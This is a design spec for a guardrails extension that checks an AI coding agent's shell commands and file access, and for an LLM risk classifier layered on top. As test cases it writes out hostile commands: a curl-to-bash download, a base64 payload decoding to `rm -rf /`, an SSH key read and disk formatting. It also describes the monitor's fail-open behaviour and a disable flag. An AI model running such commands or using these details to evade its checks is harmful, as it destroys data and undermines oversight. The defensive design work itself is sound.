---
title: Guardrails Rework and Permission-Model Redesign
date_created: 2026-04-06
date_updated: 2026-04-06
status: Approved
tags: security, guardrails, permission-model, redesign, classifier
---

# Guardrails Rework and Permission-Model Redesign

This specification documents the current state of the Guardrails extension, identifies correctness and security gaps verified against the implementation, summarizes research findings from other agent permission systems, and recommends a redesign direction. It is intended to drive a subsequent implementation plan.

**Phase 1** (sections 5.1–5.12) is complete, reviewed, and landed with 113 passing tests.
**Phase 2** (section 6) adds an inline `pi -p`-based command classifier as an additive layer on top of the Phase 1 deterministic checks.

## Definitions

| Term | Meaning |
|------|---------|
| **Guardrails extension** | The Pi extension at `extensions/guardrails/` that intercepts `tool_call` events to enforce path and bash command policies before execution. |
| **Session allow-list** | An in-memory data structure (`SessionAllowList` class in `session-allow-list.ts`) that stores scoped `(violationType, violationKey)` approvals a user has granted for the remainder of the current session. |
| **AST path** | The primary bash analysis strategy: parses commands via `shfmt -tojson` into a shell syntax tree, then walks the tree to extract command names, arguments, and redirects. |
| **Fallback path** | The secondary bash analysis strategy: splits command strings on separators (`&&`, `||`, `;`, `|`, newlines), tokenizes segments, and applies regex-based detection. Used when `shfmt` is unavailable or parsing fails. |
| **Effective cwd** | The working directory Guardrails uses for pattern resolution, defaulting to the git repository root when inside a git worktree (`effective-cwd.ts`). |
| **Pattern cwd** | The base directory against which relative glob patterns in the config are resolved. Currently equals effective cwd. |
| **Classifier layer** | A Phase 2 additive check that invokes `pi -p` as a subprocess to classify a bash command's risk level before or alongside rule-based checks. |
| **Classifier prompt** | The text prompt sent to `pi -p` containing the raw command and local context. The classifier model interprets this prompt and returns a structured risk assessment. |
| **Classifier model** | The LLM model used by the `pi -p` classifier call. Configurable via `classifier.model` in `guardrails.json`. |
| **Runtime disable flag** | A CLI/runtime flag (e.g., `--no-guardrails`) that disables all Guardrails extension behavior for the current Pi session. Not persisted across sessions. |

---

## 1. Current Implementation — Strengths

These aspects are well-designed and should be preserved or extended in the redesign.

### 1.1 Dual-Path Bash Analysis (AST + Fallback)
The hybrid `shfmt` AST parser with string-based fallback (`bash-guard.ts`) is a strong design. The AST path eliminates false positives on quoted strings (e.g., `echo "rm -rf"` does not flag `rm`), while the fallback ensures the extension works without external dependencies. Both paths feed into the same violation-checking logic.

### 1.2 CWD Tracking Across `cd` Commands
Both the AST and fallback paths track directory changes (`cd dir && cmd file`) and resolve subsequent file targets against the updated shell cwd. No other surveyed agent harness does this.

### 1.3 Symlink Protection via Canonicalization
`path-guard.ts` checks both the lexical path and the `realpathSync`-resolved canonical path against patterns. A symlink `safe-link → ~/.ssh/id_rsa` is caught by checking the resolved path. No other surveyed harness does this.

### 1.4 `allowWrite` Whitelist Semantics
The three-state `allowWrite` (`undefined` = unrestricted, `[]` = confirm everything, `[patterns]` = whitelist) provides fine-grained write control. This is more powerful than the deny-only models seen in other harnesses.

### 1.5 Prefix and Wrapper Command Unwrapping
Detailed per-command specs for prefix commands (`time`, `nice`, `timeout`, etc.) and wrapper commands (`sudo`, `bash -c`, `exec`, `xargs`, etc.) with proper flag-value consumption tables. This unwrapping ensures nested commands are checked.

### 1.6 Config Merging with Effective CWD
Two-tier config (global `~/.pi/agent/guardrails.json` + project `.pi/guardrails.json`) with mtime-based caching and field-level merging. Using the git root as effective cwd means project rules cover the whole repository.

### 1.7 Fail-Safe Non-UI Mode
When `ctx.hasUI === false`, all violations block without prompting. This is the correct default for headless/CI environments.

---

## 2. Correctness and Security Gaps (Verified Against Code)

Each issue below has been verified against the current source files.

### 2.1 Session Allow-List Is Over-Broad (CRITICAL) — ✅ FIXED in Phase 1

**Status**: Resolved. Session approvals now use scoped `(violationType, violationKey)` tuples with exact equality matching. No substring matching remains.

### 2.2 AST Traversal Misses Assignment-Based Command Substitutions (HIGH) — ✅ FIXED in Phase 1

**Status**: Resolved. `walkCommand()` now traverses `Assigns[].Value` for both `CallExpr` and `DeclClause`.

### 2.3 Path Canonicalization Has Fixed Depth Limit (MEDIUM) — ✅ FIXED in Phase 1

**Status**: Resolved. Recursive parent climbing replaces the fixed 3-level ladder.

### 2.4 File Read Target Detection Is Too Naive (MEDIUM) — ✅ FIXED in Phase 1

**Status**: Resolved. Command-aware argument parsing via `COMMAND_ARG_SPECS` skips non-file expression arguments.

### 2.5 Bash Confirmation UI Truncates Long Commands (MEDIUM) — ✅ FIXED in Phase 1

**Status**: Resolved. Full command is displayed with line wrapping via `confirmation-ui.ts`.

### 2.6 No Automated Test Suite (HIGH) — ✅ FIXED in Phase 1

**Status**: Resolved. 113 tests across session-allow-list, bash-guard, shell-ast, path-guard, config, and index modules.

---

## 3. UX Issues

### 3.1 Approval Fatigue from Binary Confirm/Deny — ✅ Mitigated in Phase 1
Scoped session approvals reduce repeat prompts without the security risks of the old substring matching.

### 3.2 No Auto-Deny for Unconditionally Blocked Commands — ✅ FIXED in Phase 1
`bash.hardDeny` provides prompt-less blocking for exact command names.

### 3.3 No Command Explanation — Phase 2 Addresses This
The classifier layer (section 6) can provide human-readable command explanations.

### 3.4 `/guardrails` Command Is Read-Only
The `/guardrails` slash command dumps the current config but provides no way to modify rules interactively.

### 3.5 No Protection Levels — ✅ FIXED in Phase 1
`paths.protectionLevels` with `noAccess` / `readOnly` / `none` levels are supported.

### 3.6 No Way to Disable Guardrails for a Session — ✅ FIXED in Phase 1
`--no-guardrails` flag and `PI_NO_GUARDRAILS=1` env var provide session-scoped disable.

---

## 4. Research Findings — Other Agent Harnesses

Source: `AGENT_PERMISSION_SYSTEMS_RESEARCH.md`, `GUARDRAILS_QUICK_START.md`, `2026-03-25-guardrails-comparison.md`.

### 4.1 Cline (VS Code)
- **Always-ask model**: every file change and terminal command requires approval via IDE diff UI.
- **Strengths**: explicit, visual review, undo via VS Code timeline.
- **Weakness**: approval fatigue (no progressive trust), IDE-specific.

### 4.2 Aider
- **Git-based post-hoc**: changes auto-committed, user reviews diffs and `/undo`s after.
- **Strengths**: non-blocking, full audit trail, familiar git workflow.
- **Weakness**: no pre-execution safety net, requires git discipline.

### 4.3 @aliou/pi-guardrails (v0.9.5)
- **AST-first** via `@aliou/sh`, named policy rules with IDs, 3 protection levels (`none`/`readOnly`/`noAccess`), `onlyIfExists` to reduce noise, auto-deny patterns, interactive settings TUI, config versioning + migrations, custom events (`guardrails:blocked`, `guardrails:dangerous`), optional LLM command explanation.
- **Weaknesses vs. ours**: no CWD tracking, no symlink protection, no `allowWrite` whitelist, no detailed prefix/wrapper unwrapping.

### 4.4 Key Design Patterns Worth Adopting

| Pattern | Source | Benefit | Status |
|---------|--------|---------|--------|
| Protection levels (none / readOnly / noAccess) | @aliou | More nuanced than binary allow/deny | ✅ Phase 1 |
| `onlyIfExists` for deny patterns | @aliou | Reduces false-positive noise dramatically | Deferred |
| Auto-deny (hard block without prompt) | @aliou | Eliminates prompts for unconditionally dangerous commands | ✅ Phase 1 |
| Named rules with IDs for dedup | @aliou | Project can override specific global rules without replacing entire arrays | Deferred |
| Approval history → progressive trust | Research | Reduces approval fatigue for repeat-approved patterns | ✅ Phase 1 (scoped) |
| Custom events on block/allow | @aliou | Enables audit logging, analytics, sound effects by other extensions | ✅ Phase 1 |
| LLM-based command classification | @aliou / Research | Catches novel threats, obfuscation, provides explanations | Phase 2 |

---

## 5. Phase 1 Redesign (Complete)

Phase 1 is complete and review-clean. All changes listed below are implemented, tested, and landed. This section is preserved as reference; see the Phase 1 plan and review artifacts for implementation details.

### 5.1 Session Allow-List: Scoped `(violationType, violationKey)` Approvals ✅
### 5.2 AST Traversal: Walk Assignment Values ✅
### 5.3 Path Canonicalization: Recursive Parent Climbing ✅
### 5.4 File Read Target Detection: Command-Aware Argument Parsing ✅
### 5.5 Bash Confirmation UI: Full Command Visibility ✅
### 5.6 Test Suite (113 tests) ✅
### 5.7 Protection Levels ✅
### 5.8 Auto-Deny (Hard Block Without Prompt) ✅
### 5.9 `onlyIfExists` for Deny Patterns — Deferred
### 5.10 Named Rules with IDs — Deferred
### 5.11 Custom Events ✅
### 5.12 Runtime Disable Flag (Session-Scoped Kill Switch) ✅

---

## 6. Classifier Layer (Phase 2)

### 6.1 Purpose

A lightweight LLM-based classifier provides a **risk score** and **intent classification** for bash commands that supplements the deterministic rule-based system. It addresses cases where static rules are insufficient:
- Novel dangerous patterns not in the deny list.
- Obfuscated commands (`base64 -d <<< "..." | bash`).
- Multi-step attack patterns that individually look safe.
- Providing human-readable explanations of what a command does and why it may be risky.

### 6.2 Mechanism: Inline `pi -p` Subprocess Call

The classifier invokes `pi -p` as a child process to classify a bash command. This reuses Pi's existing model infrastructure (provider routing, API key management, model selection) rather than building a bespoke LLM client.

**Must**:
- The classifier **must** invoke `pi` via `Bun.spawn` (or `child_process.execFile`) using the `--print` / `-p` flag in non-interactive mode: the prompt is passed as a positional argument (or via stdin), and the model's text response is captured from stdout.
- The invocation **must** include:
  - `--provider` and `--model` flags derived from the user's `classifier.model` config (see 6.3).
  - `--no-tools` to prevent the classifier call from invoking tools.
  - `--no-extensions` to prevent recursive guardrails or other extension side effects.
  - `--no-session` to avoid polluting session history.
  - `--no-skills` and `--no-prompt-templates` to keep the classifier call minimal and fast.
- The prompt sent to `pi -p` **must** include:
  - The **raw bash command** exactly as received by the guardrails extension.
  - A **structured classification system prompt** instructing the model to return a JSON object with fields: `risk` (`"high"` | `"medium"` | `"low"`), `explanation` (string, 1–2 sentences), and `category` (string, e.g. `"data_exfiltration"`, `"destructive_write"`, `"obfuscation"`, `"network_access"`, `"benign"`).
  - **Local context** to reduce false positives: the effective cwd, relevant `denyRead`/`denyWrite` patterns from the active config, and optionally the project name or git remote.
- The classifier **must** parse the JSON response from stdout. If parsing fails (model returns non-JSON, partial response, or garbage), the classifier **must** treat the result as a parse failure and fall through to rule-based-only behavior.

**Must not**:
- The classifier subprocess **must not** inherit the parent process's extensions (enforced by `--no-extensions`). This prevents recursive guardrails checks on the classifier's own execution.
- The classifier **must not** pass `--system-prompt` in a way that replaces the classification instructions. The system prompt is the classification instruction itself, passed via `--system-prompt`.
- The classifier **must not** use `--mode json` or `--mode rpc` — plain text stdout with `--print` is the only supported output capture mode.

**Should**:
- Use `--system-prompt` to provide the structured classification instructions, and pass the bash command + context as the positional prompt argument.
- Prefer `Bun.spawn` over `child_process.execFile` for lower overhead in the Bun runtime.

### 6.3 Configuration

The classifier is configured via the existing `guardrails.json` config file under a new `classifier` key.

**Config schema**:
```jsonc
{
  // ... existing guardrails config ...
  "classifier": {
    // Required to enable. Default: absent (classifier disabled).
    "enabled": true,

    // Model specification in "provider/model-id" format.
    // Required when enabled: true. No default — the user must choose.
    "model": "google/gemini-2.0-flash-lite",

    // Timeout in milliseconds for the pi -p subprocess.
    // Default: 5000 (5 seconds). The subprocess is killed if it exceeds this.
    "timeout": 5000,

    // Risk threshold that triggers a confirmation prompt.
    // "high" = only high-risk triggers prompt.
    // "medium" = medium and high trigger prompt.
    // Default: "high".
    "promptThreshold": "high",

    // Whether to show the classifier's explanation in the confirmation UI.
    // Default: true.
    "showExplanation": true
  }
}
```

**Must**:
- The `classifier` config section **must** be validated during config load in `config.ts` alongside existing validation.
- `classifier.enabled` must default to `false` (absent = disabled). The classifier is strictly opt-in.
- `classifier.model` **must** be required when `classifier.enabled` is `true`. If `enabled` is `true` but `model` is missing, emit a validation error and treat the classifier as disabled.
- `classifier.model` **must** be a string in `"provider/model-id"` format (e.g., `"google/gemini-2.0-flash-lite"`, `"anthropic/claude-haiku"`, `"ollama/llama3"`). The extension splits on the first `/` to extract `--provider` and `--model` flags.
- `classifier.timeout` **must** default to `5000` (5 seconds) if not specified.
- `classifier.promptThreshold` **must** accept only `"high"` or `"medium"`. Default: `"high"`.
- `classifier.showExplanation` **must** default to `true`.
- The classifier config **must** merge the same way as other guardrails config: project-level `classifier` overrides global-level `classifier` as a whole object.

**Should**:
- The `/guardrails` slash command **should** display classifier status: enabled/disabled, configured model, timeout, and threshold.
- The `session_start` notification **should** include a classifier status line when the classifier is enabled.

### 6.4 Integration with Guardrails Flow

The classifier runs as an **additive layer** after deterministic checks. It never replaces or weakens Phase 1 behavior.

**Execution flow**:

```
bash command received in tool_call handler
    │
    ├──► 1. Hard-deny check (deterministic, instant)
    │       └── Match → block immediately (unchanged from Phase 1)
    │
    ├──► 2. Rule-based violation check (checkBash — deterministic, instant)
    │       └── Violations found → filter by session allow-list → prompt/block (unchanged)
    │
    ├──► 3. Session allow-list full-command check
    │       └── Exact match → allow (unchanged)
    │
    └──► 4. Classifier check (NEW — only if steps 1–3 did not already block/prompt)
            │
            ├── classifier disabled → allow (no-op)
            ├── spawn pi -p subprocess with command + context
            ├── wait for response (up to classifier.timeout)
            │
            ├── timeout / parse failure / error → allow (fail-open, log warning)
            │
            ├── risk < promptThreshold → allow (log classification at debug level)
            │
            └── risk >= promptThreshold → prompt user with:
                    • the full command (same UI as rule-based prompts)
                    • the classifier's explanation (if showExplanation: true)
                    • standard allow / allow-session / deny options
```

**Must**:
- The classifier **must** only run for bash commands that **pass** all deterministic checks (hard-deny, rule-based violations, session allow-list). If the deterministic layer already surfaces violations, the classifier is skipped entirely — the user already sees a prompt from the rule-based check.
- The classifier **must** be fail-open: any failure (timeout, process crash, non-JSON response, unexpected error) results in the command being **allowed**, matching the behavior that would occur without the classifier. A warning **must** be logged (via `console.warn`) so failures are visible in verbose mode.
- Classifier results **must not** modify the `BashCheckResult` from `checkBash()`. The classifier is a separate check in `index.ts`, not wired into `bash-guard.ts`.
- Classifier-triggered prompts **must** use the same confirmation UI as rule-based prompts (`confirmBashViolation` or a variant). The "allow for session" option from a classifier prompt **must** store a session approval so the same command is not re-classified.
- When the classifier triggers a prompt, the violations shown **must** include a synthetic violation with `type: "classifier_flagged"` so the UI can display the classifier's explanation distinctly from rule-based violations.
- The classifier **must not** run when guardrails are disabled (`--no-guardrails` / `PI_NO_GUARDRAILS=1`).
- The classifier **must not** run when `ctx.hasUI === false` (headless/CI mode). In non-UI mode, deterministic checks already hard-block all violations. Adding a classifier prompt in non-UI mode is impossible, so the classifier is skipped.

**Must not**:
- The classifier **must not** override a deterministic "allow" into a "block" for hard-denied commands. Hard-deny is always final.
- The classifier **must not** suppress deterministic violations. If `checkBash()` finds violations, those violations surface regardless of what the classifier would say.

**Should**:
- Emit `guardrails:blocked` / `guardrails:allowed` events for classifier-triggered prompts, with `action` values like `"classifier-denied"` / `"classifier-approved-once"` / `"classifier-approved-session"` to distinguish them from rule-based events.
- Log the classifier's raw response (risk level, category, explanation) at debug level for observability.

### 6.5 Classifier Prompt Design

The system prompt instructs the model to act as a security classifier. The user prompt contains the command and context.

**System prompt** (passed via `--system-prompt`):
```
You are a bash command security classifier for an AI coding agent. Your job is to assess the risk level of a bash command that an AI agent wants to execute.

Respond with ONLY a JSON object (no markdown fencing, no extra text):
{"risk":"high|medium|low","explanation":"1-2 sentence explanation","category":"category_name"}

Risk levels:
- high: Command is destructive, exfiltrates data, modifies system configuration, installs software from untrusted sources, or uses obfuscation to hide intent.
- medium: Command accesses sensitive paths, uses network, or has side effects that warrant review but is not clearly malicious.
- low: Command is a standard development operation with no significant risk.

Categories: data_exfiltration, destructive_write, system_modification, network_access, obfuscation, privilege_escalation, sensitive_file_access, benign

When assessing risk, consider:
- Whether the command reads or writes to paths outside the working directory
- Pipes to bash/sh/eval (code execution from untrusted input)
- Network access (curl, wget) especially when piped to execution
- Base64/hex encoding that might hide intent
- Commands that modify system files, package managers, or user configuration
- The working directory context provided
```

**User prompt** (passed as positional argument):
```
Command: <raw bash command>
Working directory: <effective cwd>
Project deny-read patterns: <comma-separated or "none">
Project deny-write patterns: <comma-separated or "none">
```

**Must**:
- The system prompt **must** be hardcoded in the extension source, not user-configurable. This prevents prompt injection via config.
- The user prompt **must** include the raw command verbatim — no escaping, truncation, or transformation.
- The user prompt **must** include the effective cwd so the model can assess path-relative operations.
- The user prompt **should** include the active `denyRead` and `denyWrite` patterns so the model understands the project's security posture.

**Must not**:
- The prompt **must not** include the contents of files, environment variables, API keys, or other sensitive runtime data beyond the command string and directory context.

### 6.6 Classifier Response Parsing

**Expected response format** (JSON, no markdown fencing):
```json
{"risk":"high","explanation":"This command pipes content from a URL directly to bash for execution, which could run arbitrary code.","category":"obfuscation"}
```

**Must**:
- The parser **must** attempt `JSON.parse()` on the trimmed stdout.
- If the response is wrapped in markdown code fences (` ```json ... ``` `), the parser **must** strip them before parsing. Models commonly add fences despite instructions.
- If `risk` is not one of `"high"`, `"medium"`, `"low"`, treat as parse failure.
- If `explanation` is missing or not a string, use a default explanation: `"Flagged by classifier"`.
- If `category` is missing or not a string, use `"unknown"`.
- Parse failures **must** result in fail-open (command allowed).

### 6.7 Classifier Session Approvals

When a user approves a classifier-flagged command via "allow for session", the approval **must** prevent re-classification of the same command.

**Must**:
- Store a session approval with `violationType: "classifier_flagged"` and `violationKey` set to a stable key derived from the command. The key **should** be the full command string (exact match), since classifier risk depends on the complete command, not a single command name.
- Before invoking the classifier, check the session allow-list for an existing `("classifier_flagged", <full command>)` approval. If found, skip the classifier call entirely.

### 6.8 Types

Extend the existing types in `types.ts`:

```typescript
// Add to BashViolationType union:
export type BashViolationType =
  | "denied_command"
  | "hard_denied_command"
  | "file_write_detected"
  | "file_read_detected"
  | "classifier_flagged";  // NEW

// Add to SessionApprovalType:
export type SessionApprovalType = Exclude<BashViolationType, "hard_denied_command">;
// This already includes "classifier_flagged" once added to BashViolationType.

// New types for classifier:
export type ClassifierRiskLevel = "high" | "medium" | "low";
export type ClassifierPromptThreshold = "high" | "medium";

export interface ClassifierConfig {
  enabled?: boolean;
  model?: string;
  timeout?: number;
  promptThreshold?: ClassifierPromptThreshold;
  showExplanation?: boolean;
}

export interface ClassifierResult {
  risk: ClassifierRiskLevel;
  explanation: string;
  category: string;
}

// Extend GuardrailsConfig:
export interface GuardrailsConfig {
  timeout?: number;
  paths?: PathsConfig;
  bash?: BashConfig;
  classifier?: ClassifierConfig;  // NEW
}
```

### 6.9 Module Structure

**Must**:
- Create a new module `extensions/guardrails/classifier.ts` that encapsulates all classifier logic:
  - Building the `pi -p` command-line arguments.
  - Spawning the subprocess with the configured timeout.
  - Parsing and validating the response.
  - Returning a `ClassifierResult | null` (null = failure/timeout/disabled).
- The classifier module **must** export a function with a signature like:
  ```typescript
  export async function classifyCommand(
    command: string,
    context: ClassifierContext,
    config: ClassifierConfig,
  ): Promise<ClassifierResult | null>;
  ```
  where `ClassifierContext` contains `effectiveCwd`, `denyReadPatterns`, and `denyWritePatterns`.
- The classifier module **must not** import from `index.ts`. It is a leaf dependency.
- Integration with the guardrails flow happens in `index.ts`, which calls `classifyCommand()` after the deterministic checks pass.

**Should**:
- The classifier module should be independently testable by mocking the subprocess spawn.

### 6.10 Phasing Note

The classifier layer is Phase 2 — it builds on the complete Phase 1 foundation. Phase 1 deterministic checks (session allow-list, bash-guard, path-guard, hard-deny, events, runtime disable) remain the baseline and must not regress.

---

## 7. Acceptance Criteria

### Core Fixes (Phase 1 — ✅ Complete)
- **AC-1**: ✅ Session allow-list uses scoped `(violationType, violationKey)` tuples.
- **AC-2**: ✅ `SECRET=$(cat .env) echo ok` triggers a `file_read_detected` violation.
- **AC-3**: ✅ `canonicalizePath` resolves symlinks at any directory depth.
- **AC-4**: ✅ `grep "pattern" file.txt` does NOT flag `"pattern"` as a file read target.
- **AC-5**: ✅ Bash confirmation UI shows the full command.
- **AC-6**: ✅ 113 test cases, runnable via `bun test extensions/guardrails/*.test.ts`.

### Enhancements (Phase 1 — ✅ Complete)
- **AC-7**: ✅ `bash.hardDeny` silently blocks exact command names.
- **AC-8**: ✅ Protection levels (`noAccess` / `readOnly`) are supported.
- **AC-9**: ✅ `guardrails:blocked` and `guardrails:allowed` events are emitted.
- **AC-10**: ✅ `--no-guardrails` / `PI_NO_GUARDRAILS=1` disables enforcement.

### Classifier Layer (Phase 2)
- **AC-11**: When `classifier.enabled: true` and `classifier.model` is set, bash commands that pass all deterministic checks are classified via an inline `pi -p` subprocess call. The subprocess is invoked with `--no-tools`, `--no-extensions`, `--no-session`, `--no-skills`, `--no-prompt-templates`, and `--provider`/`--model` derived from `classifier.model`. The raw command and effective cwd are included in the prompt. A `risk: "high"` response (with default `promptThreshold: "high"`) triggers a confirmation prompt displaying the classifier's explanation.
- **AC-12**: Classifier timeout (default 5s via `classifier.timeout`) kills the subprocess and falls through to allow (fail-open). Non-JSON responses and parse errors also fall through to allow. A `console.warn` is emitted on any failure. Tests prove fail-open behavior for timeout, malformed response, and missing `risk` field.
- **AC-13**: Classifier is opt-in; disabled by default; no subprocess call when `classifier.enabled` is absent or `false`. Validation rejects `enabled: true` without a `model` field. No external API calls occur unless the user has explicitly configured a model. The classifier does not run in headless mode (`ctx.hasUI === false`).
- **AC-14**: Classifier-triggered "allow for session" stores `("classifier_flagged", <full command>)` and subsequent identical commands skip the classifier call. Tests prove skip behavior.
- **AC-15**: Deterministic checks (Phase 1) are completely unmodified. A command that triggers rule-based violations still shows rule-based violations — the classifier is never consulted for that command. Tests prove the classifier is not invoked when `checkBash()` returns violations.
- **AC-16**: The `/guardrails` command and `session_start` notification display classifier status (enabled/disabled, model, timeout, threshold) when the classifier section is configured.
- **AC-17**: Classifier-triggered events use distinct `action` values (`"classifier-denied"`, `"classifier-approved-once"`, `"classifier-approved-session"`, `"classifier-timed-out"`) in `guardrails:blocked` / `guardrails:allowed` payloads.

---

## 8. Examples and Edge Cases

### Phase 1 Examples (preserved for reference)

#### Edge Case: Session Allow-List Scoping (Post-Fix)

**Scenario**: User approves `sudo apt update` for session.
- **Before fix**: Future `sudo rm -rf /` is silently auto-allowed (substring match on `"sudo"`).
- **After fix**: The approval stores `("denied_command", "sudo")`. Future `sudo rm -rf /` passes the `denied_command` check for `sudo` (by design — the user approved the command name for the session). However, the `file_write_detected` violation from `rm -rf /` is **not** suppressed, because it is a different violation type. The user still sees a confirmation prompt for the destructive file operation.

#### Edge Case: Session Approval Does Not Cross Violation Types

**Scenario**: User approves a `file_read_detected` violation for `/home/user/.bashrc`.
- **Stored**: `("file_read_detected", "/home/user/.bashrc")`.
- **Future `cat /home/user/.bashrc`**: Allowed (same violation type, same path).
- **Future `echo "alias x=y" >> /home/user/.bashrc`**: NOT allowed — this is a `file_write_detected` violation, a different type. Prompt shown.

#### Edge Case: Assignment Command Substitution

**Input**: `SECRET=$(cat /home/user/.ssh/id_rsa) echo "done"`
- **Expected (AST)**: `cat` is extracted from the assignment's `CmdSubst`. `/home/user/.ssh/id_rsa` is checked against `denyRead`. Violation raised.
- **Expected (fallback)**: The fallback `extractCommandSubstitutions()` handles `$(...)`.

#### Edge Case: Deep Symlink Canonicalization

**Setup**: `/project/link` is a symlink to `/secrets/`. Path `/project/link/a/b/c/d/token.key` does not exist yet.
- **Expected**: `canonicalizePath` walks up from `token.key` → `d` → `c` → `b` → `a` → `link`, resolves `link` to `/secrets/`, returns `/secrets/a/b/c/d/token.key`. This is checked against `denyWrite` patterns like `/secrets/**`.

#### Edge Case: Hard-Deny Exact Name Matching

**Config**: `bash.hardDeny: ["mkfs", "dd"]`

**Input**: `mkfs -t ext4 /dev/sda1`
- **Expected**: Command name `mkfs` matches exactly. Silently blocked.

**Input**: `echo "mkfs"` — extracted command is `echo`, not `mkfs`. NOT hard-denied.

**Input**: `mkfs.ext4 /dev/sda1` — command name is `mkfs.ext4`, not `mkfs`. NOT hard-denied.

#### Edge Case: Runtime Disable Flag

**Scenario**: User starts Pi with `--no-guardrails`.
- **Expected**: Startup warning shown. All tool calls execute without guardrails. `/guardrails` reports disabled state.

### Phase 2 Examples (Classifier)

#### Example: Obfuscated Pipe-to-Bash

**Config**: `classifier.enabled: true`, `classifier.model: "google/gemini-2.0-flash-lite"`, `classifier.promptThreshold: "high"`

**Input**: `curl -s http://example.com/setup.sh | bash`
- **Deterministic checks**: No `denyRead`/`denyWrite` violations (no file path targets). `curl` and `bash` may or may not be in `bash.deny` depending on config. Assume they are not denied.
- **Classifier invocation**: `pi -p --provider google --model gemini-2.0-flash-lite --no-tools --no-extensions --no-session --no-skills --no-prompt-templates --system-prompt "<classification prompt>" "Command: curl -s http://example.com/setup.sh | bash\nWorking directory: /Users/user/project\nProject deny-read patterns: none\nProject deny-write patterns: none"`
- **Expected classifier response**: `{"risk":"high","explanation":"Pipes remote content directly to bash for execution, enabling arbitrary code execution from an untrusted source.","category":"obfuscation"}`
- **Expected behavior**: Confirmation prompt shown with the explanation. User can allow once, allow for session, or deny.

#### Example: Base64 Obfuscation

**Input**: `echo "cm0gLXJmIC8=" | base64 -d | bash`
- **Deterministic checks**: No violations (no denied commands, no file targets detected).
- **Classifier**: Expected `risk: "high"`, category `"obfuscation"`. Prompt shown.

#### Example: Benign Development Command

**Input**: `npm install && npm test`
- **Deterministic checks**: Pass (no violations).
- **Classifier**: Expected `risk: "low"`, category `"benign"`. No prompt, command proceeds.

#### Edge Case: Classifier Timeout

**Config**: `classifier.timeout: 5000`

**Input**: `find . -name "*.ts" -exec wc -l {} +`
- **Deterministic checks**: Pass.
- **Classifier**: Subprocess does not respond within 5s (e.g., model endpoint is slow or unreachable).
- **Expected**: Subprocess killed, `console.warn("[guardrails] Classifier timed out after 5000ms")` logged, command allowed (fail-open).

#### Edge Case: Classifier Returns Malformed JSON

**Input**: `ls -la`
- **Classifier stdout**: `Sure! Here's the assessment: {"risk": "low", ...}` (model adds prose before JSON).
- **Expected**: Parser attempts to extract JSON. If extraction fails, fall through to allow.

#### Edge Case: Classifier Returns Non-JSON

**Input**: `echo hello`
- **Classifier stdout**: `This is a safe command that just prints text.`
- **Expected**: `JSON.parse()` fails. Fail-open, command allowed, warning logged.

#### Edge Case: Classifier Disabled in Headless Mode

**Config**: `classifier.enabled: true`, `ctx.hasUI: false`
- **Input**: Any bash command passing deterministic checks.
- **Expected**: Classifier is NOT invoked. In headless mode, there is no way to show the classifier's prompt to the user, so the classifier adds no value and is skipped.

#### Edge Case: Deterministic Violations Bypass Classifier

**Config**: `classifier.enabled: true`, `bash.deny: ["rm"]`

**Input**: `rm -rf /tmp/cache`
- **Deterministic checks**: `denied_command` violation for `rm`.
- **Expected**: Classifier is NOT invoked. The rule-based violation prompt is shown. The classifier is only reached for commands that pass all deterministic checks.

#### Edge Case: Classifier Session Approval

**Config**: `classifier.enabled: true`

**Input (first time)**: `docker run --rm -v /:/host alpine sh`
- **Classifier**: `risk: "high"`. Prompt shown. User chooses "allow for session".
- **Stored**: `("classifier_flagged", "docker run --rm -v /:/host alpine sh")`.

**Input (second time, same command)**: `docker run --rm -v /:/host alpine sh`
- **Expected**: Session allow-list has exact match for `("classifier_flagged", <full command>)`. Classifier subprocess is NOT spawned. Command proceeds.

**Input (different command)**: `docker run --rm alpine ls`
- **Expected**: No session approval match (different command string). Classifier IS invoked.

#### Edge Case: classifier.model Validation

**Config**: `classifier: { "enabled": true }` (no `model` field)
- **Expected**: Validation error: `classifier.model is required when classifier.enabled is true`. Classifier treated as disabled. Logged via `console.error`.

**Config**: `classifier: { "enabled": true, "model": "gemini-flash" }` (no provider prefix)
- **Expected**: Validation error: `classifier.model must be in "provider/model-id" format`. Classifier treated as disabled.

---

## 9. Dependencies

- **shfmt**: External binary for AST-based bash parsing. Already an existing optional dependency. No change needed.
- **Pi Extension API**: `@mariozechner/pi-coding-agent` — `tool_call` event interception, `ctx.ui.custom`, `ctx.ui.confirm`, `ctx.ui.notify`, `pi.events.emit`. All currently used; custom events require `pi.events.emit` which is already available.
- **Pi CLI / runtime context**: The runtime disable flag (5.12) requires access to CLI arguments or environment variables from within the extension. `process.argv` and `process.env` are available in Node.js/Bun extensions. If Pi provides a structured runtime context object, that is preferred over raw `process.argv` parsing.
- **Pi CLI (`pi` binary)**: Phase 2 classifier requires `pi` to be available on the system PATH (or resolvable via `process.argv[0]` / `Bun.argv[0]`) for `pi -p` subprocess calls. This is inherently satisfied since the extension runs inside Pi.
- **Test runner**: Bun's built-in test runner (`bun test`) or equivalent. No new external dependency.

---

## 10. Rationale and Context

### Phase 1 Rationale (preserved for reference)

#### Why Rework Instead of Patch?
The session allow-list issue (2.1) was a security-critical design flaw, not a simple bug. Fixing it properly required rethinking the approval model.

#### Why Exact Command Name for Session Approvals? (Q1 Resolution)
The command name IS the violation key for `denied_command` violations. Scoping to the command name is both more usable and semantically correct.

#### Why Exact Names Only for bash.hardDeny? (Q2 Resolution)
Exact names are auditable — a user can read the list and know precisely what is blocked.

#### Why Tests Alongside Rather Than Test-First? (Q4 Resolution)
Writing tests alongside each change ensures tests describe the intended new behavior from the start.

#### Why a CLI/Runtime Flag for Disabling Guardrails? (Q5 Resolution)
A runtime-only flag ensures disabling guardrails is a deliberate, per-session decision.

### Phase 2 Rationale

#### Why `pi -p` Instead of a Direct HTTP/SDK Call?

1. **Reuses existing infrastructure**: Pi already handles provider routing, API key management, model discovery, rate limiting, and retries. Calling `pi -p` gets all of this for free without duplicating model-client logic in the extension.
2. **Provider-agnostic**: Any model Pi supports (Google, Anthropic, OpenAI, Ollama, etc.) works as a classifier with zero extension changes — the user just sets `classifier.model`.
3. **Isolation**: The subprocess runs with `--no-extensions --no-tools --no-session`, preventing recursive guardrails, tool use, and session pollution. This is harder to guarantee with an in-process SDK call.
4. **Simplicity**: The extension spawns one process, reads stdout, parses JSON. No HTTP client, no streaming, no auth token management.
5. **Tradeoff**: Subprocess overhead (~100–300ms spawn time) is acceptable given the classifier timeout budget (5s default) and the fact that it only runs for commands that pass deterministic checks.

#### Why Fail-Open Instead of Fail-Closed?

The classifier is an **advisory additive layer**. If it fails, the user gets the same behavior as if the classifier were not configured at all — which is the Phase 1 baseline, already reviewed and approved. Fail-closed would mean a network blip or model outage blocks all bash commands, which is unacceptable for a development tool.

